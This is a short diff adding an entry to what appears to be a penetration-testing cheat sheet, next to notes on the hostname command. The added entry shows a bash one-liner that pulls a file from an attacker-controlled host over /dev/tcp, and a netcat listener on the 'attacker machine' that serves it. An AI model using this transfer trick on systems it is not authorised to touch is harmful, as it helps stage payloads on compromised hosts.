@@ -54,3 +54,8 @@ hostname -I
     -i, --ip-address       addresses for the host name
     -I, --all-ip-addresses all addresses for the host
 
+# download files with just bash
+```bash
+bash -c "cat < /dev/tcp/$LHOST/$LPORT" > filename
+```
+On attacker machine, `nc -lvnp $LPORT < filename`
